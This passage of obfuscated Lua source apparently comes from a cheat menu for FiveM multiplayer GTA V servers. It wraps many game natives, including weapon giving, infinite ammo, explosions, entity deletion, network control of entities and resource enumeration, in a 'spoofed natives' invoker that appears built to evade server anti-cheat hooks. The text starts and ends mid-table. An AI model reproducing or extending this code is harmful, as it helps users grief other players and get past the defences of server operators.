        SetPedKeepTask = function(ped, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedKeepTask'], ped, toggle)
        end,
        IsDisabledControlJustPressed = function(index, control)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsDisabledControlJustPressed'], index, control, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsDisabledControlReleased = function(inputGroup, control)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsDisabledControlReleased'], inputGroup, control, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetVehicleModKit = function(vehicle, modKit)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleModKit'], vehicle, modKit)
        end,
        GetNumVehicleMods = function(vehicle, modType)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetNumVehicleMods'], vehicle, modType, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetModTextLabel = function(vehicle, modType, modValue)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetModTextLabel'], vehicle, modType, modValue, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        GetLabelText = function(labelName)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetLabelText'], RfPsUKHSFWJuBEJuz.rE.LumToString(labelName), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        SetVehicleMod = function(vehicle, modType, modIndex, customTires)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleMod'], vehicle, modType, modIndex, customTires)
        end,
        ToggleVehicleMod = function(vehicle, modType, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ToggleVehicleMod'], vehicle, modType, toggle)
        end,
        SetVehicleGravityAmount = function(vehicle, gravity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleGravityAmount'], vehicle, gravity)
        end,
        SetVehicleForwardSpeed = function(vehicle, speed)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleForwardSpeed'], vehicle, speed)
        end,
        SetVehicleNumberPlateText = function(vehicle, plateText)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleNumberPlateText'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumToString(plateText))
        end,
        DoesEntityExist = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DoesEntityExist'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetVehicleColours = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehicleColours'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumI(), RfPsUKHSFWJuBEJuz.rE.LumI())
        end,
        GetVehicleExtraColours = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehicleExtraColours'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumI(), RfPsUKHSFWJuBEJuz.rE.LumI())
        end,
        DoesExtraExist = function(vehicle, extraId)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DoesExtraExist'], vehicle, extraId, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsVehicleExtraTurnedOn = function(vehicle, extraId)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsVehicleExtraTurnedOn'], vehicle, extraId, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetEntityModel = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetEntityModel'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetVehicleWheelType = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehicleWheelType'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetVehicleWindowTint = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehicleWindowTint'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        IsVehicleNeonLightEnabled = function(vehicle, index)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsVehicleNeonLightEnabled'], vehicle, index, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetVehicleNeonLightsColour = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehicleNeonLightsColour'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumI(), RfPsUKHSFWJuBEJuz.rE.LumI(), RfPsUKHSFWJuBEJuz.rE.LumI())
        end,
        GetVehicleTyreSmokeColor = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehicleTyreSmokeColor'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumI(), RfPsUKHSFWJuBEJuz.rE.LumI(), RfPsUKHSFWJuBEJuz.rE.LumI())
        end,
        GetVehicleMod = function(vehicle, modType)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehicleMod'], vehicle, modType, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        IsToggleModOn = function(vehicle, modType)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsToggleModOn'], vehicle, modType, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetVehicleLivery = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehicleLivery'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        SetVehicleFixed = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleFixed'], vehicle)
        end,
        SetVehicleLightsMode = function(vehicle, p1)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleLightsMode'], vehicle, p1)
        end,
        SetVehicleLights = function(vehicle, p1)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleLights'], vehicle, p1)
        end,
        SetVehicleBurnout = function(vehicle, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleBurnout'], vehicle, toggle)
        end,
        SetVehicleEngineHealth = function(vehicle, health)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleEngineHealth'], vehicle, health)
        end,
        SetVehicleFuelLevel = function(vehicle, level)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleFuelLevel'], vehicle, level)
        end,
        SetVehicleOilLevel = function(vehicle, level)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleOilLevel'], vehicle, level)
        end,
        SetVehicleDirtLevel = function(vehicle, dirtLevel)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleDirtLevel'], vehicle, dirtLevel)
        end,
        SetVehicleOnGroundProperly = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleOnGroundProperly'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetEntityAsMissionEntity = function(entity, value, p2)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetEntityAsMissionEntity'], entity, value, p2)
        end,
        DeleteVehicle = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DeleteVehicle'], RfPsUKHSFWJuBEJuz.rE.LumII(vehicle))
        end,
        GetVehicleClass = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehicleClass'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        SetVehicleWheelType = function(vehicle, WheelType)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleWheelType'], vehicle, WheelType, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        SetVehicleExtraColours = function(vehicle, pearlescentColor, wheelColor)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleExtraColours'], vehicle, pearlescentColor, wheelColor)
        end,
        SetVehicleColours = function(vehicle, colorPrimary, colorSecondary)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleColours'], vehicle, colorPrimary, colorSecondary)
        end,
        SetVehicleNeonLightEnabled = function(vehicle, index, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleNeonLightEnabled'], vehicle, index, toggle)
        end,
        SetVehicleNeonLightsColour = function(vehicle, r, g, b)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleNeonLightsColour'], vehicle, r, g, b)
        end,
        SetVehicleWindowTint = function(vehicle, tint)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleWindowTint'], vehicle, tint)
        end,
        IsWeaponValid = function(weaponHash)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsWeaponValid'], RfPsUKHSFWJuBEJuz.rE.LumHash(weaponHash), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GiveWeaponToPed = function(ped, weaponHash, ammoCount, p4, equipNow)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GiveWeaponToPed'], ped, RfPsUKHSFWJuBEJuz.rE.LumHash(weaponHash), ammoCount, p4, equipNow)
        end,
        GetSelectedPedWeapon = function(ped)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetSelectedPedWeapon'], ped, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        SetWeaponDamageModifier = function(weaponHash, damageAmount)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetWeaponDamageModifier'], RfPsUKHSFWJuBEJuz.rE.LumHash(weaponHash), damageAmount)
        end,
        SetPlayerMeleeWeaponDamageModifier = function(player, modifier)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPlayerMeleeWeaponDamageModifier'], player, modifier)
        end,
        SetPedInfiniteAmmoClip = function(ped, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedInfiniteAmmoClip'], ped, toggle)
        end,
        GetPedLastWeaponImpactCoord = function(ped, coords)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPedLastWeaponImpactCoord'], ped, RfPsUKHSFWJuBEJuz.rE.LumPVV(), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        AddExplosion = function(x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['AddExplosion'], x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake)
        end,
        HasPedGotWeaponComponent = function(ped, weaponHash, componentHash)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['HasPedGotWeaponComponent'], ped, RfPsUKHSFWJuBEJuz.rE.LumHash(weaponHash), RfPsUKHSFWJuBEJuz.rE.LumHash(componentHash), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GiveWeaponComponentToPed = function(ped, weaponHash, componentHash)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GiveWeaponComponentToPed'], ped, RfPsUKHSFWJuBEJuz.rE.LumHash(weaponHash), RfPsUKHSFWJuBEJuz.rE.LumHash(componentHash))
        end,
        RemoveWeaponComponentFromPed = function(ped, weaponHash, componentHash)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['RemoveWeaponComponentFromPed'], ped, RfPsUKHSFWJuBEJuz.rE.LumHash(weaponHash), RfPsUKHSFWJuBEJuz.rE.LumHash(componentHash))
        end,
        AddAmmoToPed = function(ped, weaponHash, ammo)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['AddAmmoToPed'], ped, RfPsUKHSFWJuBEJuz.rE.LumHash(weaponHash), ammo)
        end,
        GetNumResources = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetNumResources'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetResourceByFindIndex = function(findIndex)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetResourceByFindIndex'], findIndex, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        GetResourceState = function(resourceName)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetResourceState'], RfPsUKHSFWJuBEJuz.rE.LumToString(resourceName), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        CreateCamWithParams = function(p1, p2, p3, p4, p5, p6, p7, p8, p9, p10)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['CreateCamWithParams'], RfPsUKHSFWJuBEJuz.rE.LumToString(p1), p2, p3, p4, p5, p6, p7, p8, p9, p10, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetGameplayCamFov = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetGameplayCamFov'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAF())
        end,
        GetCamCoord = function(cam)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetCamCoord'], cam, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAV())
        end,
        GetCamRot = function(cam, rotationOrder)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetCamRot'], cam, rotationOrder, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAV())
        end,
        GetShapeTestResult = function(rayHandle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetShapeTestResult'], rayHandle, RfPsUKHSFWJuBEJuz.rE.LumI(), RfPsUKHSFWJuBEJuz.rE.LumPVV(), RfPsUKHSFWJuBEJuz.rE.LumPVV(), RfPsUKHSFWJuBEJuz.rE.LumI(), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        StartShapeTestRay = function(x1, y1, z1, x2, y2, z2, flags, entity, p8)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['StartShapeTestRay'], x1, y1, z1, x2, y2, z2, flags, entity, p8, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        SetHdArea = function(x, y, z, ground)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetHdArea'], x, y, z, ground)
        end,
        DisplayRadar = function(Toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DisplayRadar'], Toggle)
        end,
        SetFocusPosAndVel = function(p1, p2, p3, p4, p5, p6)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetFocusPosAndVel'], p1, p2, p3, p4, p5, p6)
        end,
        NetworkRequestControlOfEntity = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['NetworkRequestControlOfEntity'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        DeleteEntity = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DeleteEntity'], RfPsUKHSFWJuBEJuz.rE.LumII(entity))
        end,
        DeleteObject = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DeleteObject'], RfPsUKHSFWJuBEJuz.rE.LumII(entity))
        end,
        DeletePed = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DeletePed'], RfPsUKHSFWJuBEJuz.rE.LumII(entity))
        end,
        SetEntityCoords = function(entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetEntityCoords'], entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea)
        end,
        SetEntityRotation = function(entity, pitch, roll, yaw, rotationOrder, p5)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetEntityRotation'], entity, pitch, roll, yaw, rotationOrder, p5)
        end,
        GetGameplayCamRot = function(rotationOrder)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetGameplayCamRot'], rotationOrder, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAV())
        end,
        SetEntityVelocity = function(entity, x, y, z)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetEntityVelocity'], entity, x, y, z)
        end,
        NetworkHasControlOfEntity = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['NetworkHasControlOfEntity'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetNetworkIdCanMigrate = function(netId, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetNetworkIdCanMigrate'], netId, toggle)
        end,
        NetworkGetNetworkIdFromEntity = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['NetworkGetNetworkIdFromEntity'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetPedInVehicleSeat = function(vehicle, index)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPedInVehicleSeat'], vehicle, index, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetEntityHeading = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetEntityHeading'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAF())
        end,
        RequestScaleformMovie = function(scaleformName)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['RequestScaleformMovie'], scaleformName, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        HasScaleformMovieLoaded = function(scaleformHandle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['HasScaleformMovieLoaded'], scaleformHandle, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        PushScaleformMovieFunction = function(scaleform, functionName)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['PushScaleformMovieFunction'], scaleform, RfPsUKHSFWJuBEJuz.rE.LumToString(functionName), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        PushScaleformMovieFunctionParameterBool = function(value)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['PushScaleformMovieFunctionParameterBool'], value)
        end,
        PopScaleformMovieFunctionVoid = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['PopScaleformMovieFunctionVoid'])
        end,
        PushScaleformMovieFunctionParameterInt = function(value)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['PushScaleformMovieFunctionParameterInt'], value)
        end,
        PushScaleformMovieMethodParameterButtonName = function(p1)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['PushScaleformMovieMethodParameterButtonName'], RfPsUKHSFWJuBEJuz.rE.LumToString(p1))
        end,
        PushScaleformMovieFunctionParameterString = function(value)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['PushScaleformMovieFunctionParameterString'], RfPsUKHSFWJuBEJuz.rE.LumToString(value))
        end,
        DrawScaleformMovieFullscreen = function(scaleform, r, g, b, a)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DrawScaleformMovieFullscreen'], scaleform, r, g, b, a)
        end,
        GetFirstBlipInfoId = function(blipSprite)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetFirstBlipInfoId'], blipSprite, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        DoesBlipExist = function(blip)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DoesBlipExist'], blip, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetBlipInfoIdCoord = function(blip)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetBlipInfoIdCoord'], blip, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAV())
        end,
        SetPedCoordsKeepVehicle = function(ped, posX, posY, posZ)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedCoordsKeepVehicle'], ped, posX, posY, posZ)
        end,
        NetworkRegisterEntityAsNetworked = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['NetworkRegisterEntityAsNetworked'], entity)
        end,
        VehToNet = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['VehToNet'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        IsEntityInWater = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsEntityInWater'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetVehicleEngineOn = function(vehicle, value, instantly)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleEngineOn'], vehicle, value, instantly)
        end,
        SetPedMaxTimeUnderwater = function(ped, value)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedMaxTimeUnderwater'], ped, value)
        end,
        GetPedBoneCoords = function(ped, boneId, offsetX, offsetY, offsetZ)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPedBoneCoords'], ped, boneId, offsetX, offsetY, offsetZ, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAV())
        end,
        GetDistanceBetweenCoords = function(x1, y1, z1, x2, y2, z2, unknown)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetDistanceBetweenCoords'], x1, y1, z1, x2, y2, z2, unknown, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAF())
        end,
        GetScreenCoordFromWorldCoord = function(worldX, worldY, worldZ)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetScreenCoordFromWorldCoord'], worldX, worldY, worldZ, RfPsUKHSFWJuBEJuz.rE.LumPVF(), RfPsUKHSFWJuBEJuz.rE.LumPVF(), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsEntityDead = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsEntityDead'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        HasEntityClearLosToEntity = function(entity1, entity2, traceType)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['HasEntityClearLosToEntity'], entity1, entity2, traceType, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsPedShooting = function(ped)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsPedShooting'], ped, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsEntityOnScreen = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsEntityOnScreen'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        FindFirstPed = function(outEntity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['FindFirstPed'], RfPsUKHSFWJuBEJuz.rE.LumII(outEntity), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        FindNextPed = function(findHandle, outEntity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['FindNextPed'], findHandle, RfPsUKHSFWJuBEJuz.rE.LumII(outEntity), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        EndFindPed = function(findHandle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['EndFindPed'], findHandle)
        end,
        SetDrawOrigin = function(x, y, z, p3)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetDrawOrigin'], x, y, z, p3)
        end,
        SetTextProportional = function(p0)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetTextProportional'], p0)
        end,
        SetTextDropshadow = function(distance, r, g, b, a)
